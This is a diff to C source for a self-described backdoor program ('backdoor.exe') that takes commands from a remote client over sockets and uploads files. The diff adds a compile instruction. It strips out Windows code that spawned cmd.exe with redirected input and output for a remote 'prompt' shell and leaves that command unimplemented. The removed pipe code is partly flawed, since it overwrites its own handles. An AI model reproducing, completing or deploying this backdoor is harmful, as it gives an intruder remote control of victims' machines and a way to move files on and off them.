@@ -12,6 +12,9 @@
 
 /* --- File upload fully works now :P (All FiXeD) --- */
 
+/* To compile run: gcc -o backdoor.exe backdoor.c -lws2_32
+ */
+
 #if defined(_WIN32)
 	#include <winsock2.h>
 	#include <windows.h>
@@ -167,32 +170,14 @@ void strip_cmd(cmd)
 	*(cmd+i) = 0;
 }
 
-#define BUFSIZE 4096
-
 void handle_clients(socket,address)
 	int *socket;
 	const char *address;
 {
-#if defined(_WIN32)
-	SECURITY_ATTRIBUTES saAttr;
-	HANDLE child_rd;
-	HANDLE child_wr;
-	HANDLE hSockFile;
-	void create_child();
-	void writepipe();
-	void readpipe();
-#endif
 	void handle_commands();
 	void get_cmd();
 	char msg[256];
 	char cmd[128];
-
-#if defined(_WIN32)
-	hSockFile = NULL;
-	hSockFile = CreateFile("SocketInfo.log",GENERIC_READ,0,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_TEMPORARY,NULL);
-	if(hSockFile == NULL)
-		printf("Warning: prompt command is\ndisabled, do to socket not opened for reading.\n");
-#endif
 
 	while(1) {
 		memset(msg,0,sizeof(msg));
@@ -208,31 +193,8 @@ void handle_clients(socket,address)
 			handle_commands(socket,address);
 		} else if(strcmp(cmd,"prompt") == 0) {
 #if defined(_WIN32)
-			if(hSockFile != NULL) {
-				saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
-				saAttr.bInheritHandle = TRUE;
-				saAttr.lpSecurityDescriptor = NULL;
-
-				/* create a pipe for the child process's stdout */
-				if(CreatePipe(&child_rd,&child_wr,&saAttr,0) == 0)
-					puts("Error: Cannot create stdout pipe.");
-
-				/* make the read handle to the pipe for stdout not inherited */
-				if(SetHandleInformation(child_rd,HANDLE_FLAG_INHERIT,0) == 0)
-					puts("Error: Cannot make handle not inherited for stdout.");
-
-				/* create pipe for the child process's stdin */
-				if(CreatePipe(&child_rd,&child_wr,&saAttr,0) == 0)
-					puts("Error: Cannot create stdin pipe.");
-
-				/* make the write handle to the pipe for stdin not inherited */
-				if(SetHandleInformation(child_wr,HANDLE_FLAG_INHERIT,0) == 0)
-					puts("Error: Cannot make handle not inherited for stdin.");
-
-				/* Create the child process */
-				create_child(hSockFile,child_wr,child_rd);
-			} else
-				printf("Warning: Socket wasn't opened cannot read.\n");
+			sprintf(msg,"Command not yet implemented.\r\n");
+			send(*socket,msg,strlen(msg),0);
 #else
 			sprintf(msg,"Command not yet implemented.\r\n");
 			send(*socket,msg,strlen(msg),0);
@@ -474,83 +436,4 @@ int upload_file(address,filename,isserver)
 		close(sockfd);
 #endif
 	return 0;
-}
-
-/* create_child() - creates child process to redirect input/output.
- */
-void create_child(file,child_wr,child_rd)
-	HANDLE file;
-	HANDLE child_wr;
-	HANDLE child_rd;
-{
-	PROCESS_INFORMATION piInfo;
-	STARTUPINFO siInfo;
-	BOOL bSuccess = FALSE;
-
-	void writepipe();
-	void readpipe();
-
-	/* Set up member of the PROCESS_INFORMATION struct */
-	ZeroMemory(&piInfo,sizeof(piInfo));
-
-	/* Set up members of the STARTUPINFO struct */
-	ZeroMemory(&siInfo,sizeof(siInfo));
-	siInfo.cb = sizeof(STARTUPINFO);
-	siInfo.hStdError = child_wr;
-	siInfo.hStdOutput = child_wr;
-	siInfo.hStdInput = child_rd;
-	siInfo.dwFlags |= STARTF_USESTDHANDLES;
-
-	/* Create child process */
-	bSuccess = CreateProcess("C:\\Windows\\System32\\cmd.exe","child",NULL,NULL,TRUE,0,NULL,
-		NULL,&siInfo,&piInfo);
-
-	if(bSuccess == FALSE)
-		printf("Error: Couldn't create child process.\n");
-	else {
-		while(piInfo.hProcess != 0) {
-			writepipe(file,child_wr);
-			readpipe(child_rd);
-		}
-		CloseHandle(piInfo.hProcess);
-		CloseHandle(piInfo.hThread);
-	}
-}
-
-void writepipe(file,child_wr)
-	HANDLE file;
-	HANDLE child_wr;
-{
-	DWORD dwRead,dwWritten;
-	CHAR chBuf[BUFSIZE];
-	BOOL bSuccess = FALSE;
-
-	for(;;) {
-		bSuccess = ReadFile(file,chBuf,BUFSIZE,&dwRead,NULL);
-		if(bSuccess == FALSE || dwRead == 0) break;
-
-		bSuccess = WriteFile(child_wr,chBuf,dwRead,&dwWritten,NULL);
-		if(bSuccess == FALSE) break;
-	}
-
-	/* Close the pipe handle so the child stops reading. */
-	if(CloseHandle(child_wr) == 0)
-		printf("Error: StdInWr CloseHandle\n");
-}
-
-void readpipe(child_rd)
-	HANDLE child_rd;
-{
-	DWORD dwRead,dwWritten;
-	CHAR chBuf[BUFSIZE];
-	BOOL bSuccess = FALSE;
-	HANDLE hParentStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
-
-	for(;;) {
-		bSuccess = ReadFile(child_rd,chBuf,BUFSIZE,&dwRead,NULL);
-		if(bSuccess == FALSE || dwRead == 0) break;
-
-		bSuccess = WriteFile(hParentStdOut,chBuf,dwRead,&dwWritten,NULL);
-		if(bSuccess == FALSE) break;
-	}
 }
